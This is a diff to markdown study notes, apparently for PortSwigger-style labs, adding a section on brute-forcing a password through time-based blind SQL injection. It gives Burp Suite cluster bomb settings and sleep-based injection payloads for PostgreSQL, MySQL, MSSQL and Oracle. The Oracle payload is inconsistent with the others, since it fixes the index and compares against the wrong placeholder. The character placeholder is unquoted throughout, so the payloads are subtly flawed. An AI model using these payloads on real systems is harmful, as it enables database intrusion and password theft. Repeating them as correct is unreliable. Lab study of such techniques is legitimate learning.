@@ -91,6 +91,43 @@ check the PortSwigger CHEATSHEET for database specific payloads.
 */
 ```
 
+### 5. Bruteforcing Password 
+
+- **SETUP**
+	- Use BurpSuite **CLUSTER BOMB ATTACK**.
+	- **Payload 1 Configuration**
+	    - `§1§` is the **INDEX VALUE**.
+	    - `§1§` should contain numbers from 1 to **length of the password**.
+	    - `Payload Type -> Numbers`, `Start -> 1`, `End -> length of password`, `Step -> 1`
+	    - Testing each character from the **payload 2** wordlist against each index of the password value.
+	- **Payload 2 Configuration**
+	    - `§2§` is the **WORDLIST CHARACTER**.
+	    - `§2§` will contain one character each line.
+	    - `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
+	- **Monitoring Delay**
+		- To do this, click the **Resource pool** tab to open the **Resource pool** side panel and add the attack to a resource pool.
+		
+- **WORKING**
+	- If there is no delay then wrong character else correct character.
+
+**TIP : Best way to do this is to manually check §1§ by incrementing and bruteforcing each index position and monitoring the delay when occurs. Do §1§ manual checking by incrementing and keep §2§ ready for BurpSuite Intruder Attack.**
+
+```sql
+-- PostgreSQL
+'%3BSELECT+CASE+WHEN+(<username column>='<username>'+AND+SUBSTRING(<password_column>,§1§,1)=§2§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+<table_name>--
+
+-- MySQL / MariaDB
+'%3BSELECT+IF((<username column>='<username>'+AND+SUBSTRING(<password_column>,§1§,1)=§2§),SLEEP(10),SLEEP(0))+FROM+<table_name>#
+
+-- Microsoft SQL Server (MSSQL)
+'%3BIF(<username column>='<username>'+AND+SUBSTRING(<password_column>,§1§,1)=§2§)+WAITFOR+DELAY+'0:0:10'--
+
+-- Oracle
+'%3BSELECT+CASE+WHEN+(<username column>='<username>'+AND+SUBSTR(<password_column>,1,1)=§1§)+THEN+DBMS_PIPE.RECEIVE_MESSAGE('ADS',10)+ELSE+NULL+END+FROM+<table_name>--
+/* 
+check the PortSwigger CHEATSHEET for database specific payloads. 
+*/
+```
 
 ---
 ## Examining the Database
